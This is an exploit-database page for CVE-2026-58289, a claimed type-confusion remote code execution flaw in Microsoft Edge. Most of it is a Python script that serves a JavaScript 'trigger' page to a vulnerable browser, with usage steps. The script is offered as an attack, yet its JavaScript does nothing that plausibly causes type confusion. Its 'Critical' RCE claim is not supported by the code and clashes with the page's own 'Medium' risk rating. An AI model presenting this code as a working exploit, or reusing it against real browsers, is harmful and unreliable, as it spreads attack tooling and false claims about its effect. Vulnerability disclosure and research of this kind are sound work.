---
title: Microsoft Edge < = 150.0.4078.48 (Chromium-based) Type Confusion RCE
url: https://cxsecurity.com/issue/WLB-2026070009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-19
fetch_date: 2026-07-20T05:32:05.122047
---

# Microsoft Edge < = 150.0.4078.48 (Chromium-based) Type Confusion RCE

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Edge <= 150.0.4078.48 (Chromium-based) Type Confusion RCE** **2026.07.19**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-58289](https://cxsecurity.com/cveshow/CVE-2026-58289/ "Click to see CVE-2026-58289")**  CWE: **[CWE-843 Access of Resource Using Incompatible Type (&#039;Type Confusion&#039;)](https://cxsecurity.com/cwe/CWE-843%20Access%20of%20Resource%20Using%20Incompatible%20Type%20%28%26#039;Type Confusion&#039;) "Click to see CWE-843 Access of Resource Using Incompatible Type ('Type Confusion')")** | |

#!/usr/bin/env python3
# Exploit Title: Microsoft Edge <= 150.0.4078.48 (Chromium-based) Type Confusion RCE
# CVE: CVE-2026-58289
# Date: 2026-07-10
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://microsoft.com
# Software Link: https://www.microsoft.com/en-us/edge
# Affected: Microsoft Edge (Chromium-based) before 150.0.4078.48
# Tested on: Microsoft Edge 150.0.4070.x (Windows 11)
# Category: Remote
# Platform: Windows
# Exploit Type: Remote Code Execution
# CVSS: 9.0 (Critical)
# Description: Access of Resource Using Incompatible Type ('Type Confusion' - CWE-843) in Microsoft Edge (Chromium-based) V8 engine allows an unauthorized attacker to execute arbitrary code over a network by visiting a malicious webpage.
# Fixed in: Microsoft Edge 150.0.4078.48 (Stable Channel)
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# --port Custom port (default: 8080)
#
# Notes:
# • This is a Proof of Concept only. No public full exploit is available yet.
# • For educational and research purposes.
# • Requires vulnerable version of Microsoft Edge.
#
# How to Use
#
# Step 1:
# Run the Python server: python3 exploit.py
#
# Step 2:
# Open http://localhost:8080 in a vulnerable version of Microsoft Edge.
#
# Step 3:
# Monitor the browser process for crashes or code execution.
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ███████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╝
""")
import http.server
import socketserver
import sys
banner()
HTML\_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CVE-2026-58289 PoC</title>
</head>
<body>
<h1>CVE-2026-58289 Type Confusion PoC - For Testing Only</h1>
<script>
function triggerTypeConfusion() {
let obj1 = { a: 1, b: 2 };
for (let i = 0; i < 10000; i++) {
dummyFunc(obj1);
}
let arr = new Array(0x100);
let confused = obj1;
confused.something = 0x41414141;
console.log("[+] Type confusion attempted.");
}
function dummyFunc(o) {
return o.a + o.b;
}
window.onload = function() {
try {
triggerTypeConfusion();
} catch(e) {
console.error("Error:", e);
}
};
</script>
</body>
</html>
"""
class Handler(http.server.SimpleHTTPRequestHandler):
def do\_GET(self):
if self.path in ['/poc.html', '/']:
self.send\_response(200)
self.send\_header('Content-type', 'text/html')
self.end\_headers()
self.wfile.write(HTML\_CONTENT.encode())
else:
self.send\_response(404)
self.end\_headers()
port = 8080
if len(sys.argv) > 1:
try:
port = int(sys.argv[1])
except:
pass
print(f"[+] Starting PoC server on http://localhost:{port}")
print("[+] Open the URL in vulnerable Microsoft Edge")
try:
with socketserver.TCPServer(("", port), Handler) as httpd:
httpd.serve\_forever()
except KeyboardInterrupt:
print("\n[-] Server stopped.")
except Exception as e:
print(f"[-] Error: {e}")

**##### References:**

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-58289

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026070009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top